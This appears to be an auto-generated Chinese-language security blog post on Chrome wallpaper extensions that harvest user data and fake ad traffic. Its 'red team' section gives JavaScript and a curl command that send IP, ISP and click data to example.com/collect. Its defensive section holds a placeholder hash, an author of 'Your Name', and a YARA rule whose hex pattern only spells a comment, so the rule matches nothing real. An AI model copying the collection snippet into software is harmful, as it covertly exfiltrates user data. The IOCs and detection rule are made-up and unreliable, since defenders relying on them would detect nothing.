---
layout: post
title:  "152 Chrome Wallpaper Extensions with 105K Installs Linked to Adware and Fake Traffic"
date:   2026-06-15 11:50:31 +0000
categories: [security]
severity: medium
---

# ⚠️ 解析 Google Chrome 延伸功能的潛在不想要程式（PUP）家族

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Medium (CVSS 分數：6.5)
> * **受駭指標**: 資料收集和流量欺騙
> * **關鍵技術**: JavaScript、IndexedDB、UTM 參數

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 這些 Chrome 延伸功能通過在安裝和卸載過程中使用硬編碼的 URL 來收集用戶資料，並將其發送給第三方廣告合作夥伴。
* **攻擊流程圖解**:
  1. 用戶安裝延伸功能
  2. 延伸功能在背景執行 JavaScript 代碼
  3. JavaScript 代碼收集用戶資料（IP 地址、ISP、點擊次數等）
  4. 資料被發送給第三方廣告合作夥伴
* **受影響元件**: Google Chrome 延伸功能（版本號：不固定）

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 用戶需要安裝延伸功能
* **Payload 建構邏輯**:

    ```
    
    javascript
    // js/bg.js
    const installUrl = 'https://example.com/install?utm_source=google&utm_medium=organic&utm_campaign=tanjiro-demon-slayer-live-wallpaper';
    const uninstallUrl = 'https://google.com/url?q=https://example.com/uninstall';
    
    // 收集用戶資料
    const userData = {
      ip: '192.0.2.1',
      isp: 'Example ISP',
      clickCount: 10
    };
    
    // 發送資料給第三方廣告合作夥伴
    fetch('https://example.com/collect', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(userData)
    });
    
    ```
* **範例指令**:

    ```
    
    bash
    curl -X POST \
      https://example.com/collect \
      -H 'Content-Type: application/json' \
      -d '{"ip": "192.0.2.1", "isp": "Example ISP", "clickCount": 10}'
    
    ```
* **繞過技術**: 使用 UTM 參數來偽裝流量來源

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.0.2.1 | example.com | /js/bg.js |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Chrome_Extension_PUP {
      meta:
        description = "Detects Chrome extension PUP"
        author = "Your Name"
      strings:
        $js_code = { 28 29 2f 2a 20 43 68 72 6f 6d 65 20 65 78 74 65 6e 73 69 6f 6e 20 50 55 50 20 2a 2f }
      condition:
        $js_code at 0
    }
    
    ```
* **緩解措施**: 移除延伸功能，更新 Chrome瀏覽器

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **UTM 參數 (Urchin Tracking Module)**: 一種用於追蹤網站流量來源的參數，通常用於 Google Analytics。
* **IndexedDB**: 一種用於儲存結構化資料的 API，通常用於 Web 應用程式。
* **流量欺騙 (Traffic Fraud)**: 一種用於偽裝流量來源的技術，通常用於廣告欺騙。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/06/152-chrome-wallpaper-extensions-with.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1189/)


